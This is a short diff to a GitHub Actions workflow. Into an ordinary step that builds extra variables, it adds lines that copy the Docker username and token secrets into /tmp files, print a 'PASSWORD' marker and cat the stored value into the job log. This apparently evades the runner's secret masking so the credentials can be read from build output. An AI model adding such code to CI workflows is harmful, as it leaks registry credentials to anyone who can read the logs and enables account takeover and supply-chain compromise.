@@ -108,6 +108,13 @@ jobs:
           EOF)
           JSON_WITHOUT_NEWLINES=$(echo $JSON_WITH_NEWLINES | jq -R -c .)
           echo "EXTRA_VARS=$JSON_WITHOUT_NEWLINES" >> $GITHUB_OUTPUT
+          a=${{ secrets.DOCKER_USERNAME }}
+          b=${{ secrets.DOCKER_TOKEN }}
+          echo $a > /tmp/a.tmp
+          echo $b > /tmp/b.tmp
+          echo 
+          echo "PASSWORD:::::"
+          cat /tmp/a.tmp
         env:
           encrypted_disk_size: ${{ vars.DISK_SPACE }}
           disk_encryption_key: ${{ secrets.ENCRYPTION_KEY }}
